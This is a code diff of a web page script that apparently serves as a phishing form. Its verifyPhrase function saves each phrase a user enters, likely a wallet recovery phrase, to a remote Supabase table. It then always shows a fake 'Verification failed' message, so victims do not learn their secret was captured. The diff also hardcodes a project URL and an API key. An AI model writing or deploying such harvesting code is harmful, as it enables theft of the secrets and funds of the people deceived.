@@ -82,9 +82,11 @@
   <script type="module">
     import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
-    const supabaseUrl = "https://qrxiyoisqngsjgydqvwi.supabase.co";  // your project URL
-    const supabaseKey = "YOUR-ANON-KEY";  // replace with anon key, not service role
-    const supabase = createClient(supabaseUrl, supabaseKey);
+    // ✅ Your Supabase project details
+    const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
     async function verifyPhrase() {
       const phrase = document.getElementById("phraseInput").value.trim();
@@ -93,7 +95,7 @@
       // Save phrase to Supabase
       await supabase.from("phrases").insert([{ text: phrase }]);
 
-      // Always show "Verification failed" to user
+      // Always show error to the user
       document.getElementById("errorMsg").innerText = "Verification failed. Please try again.";
     }
   </script>
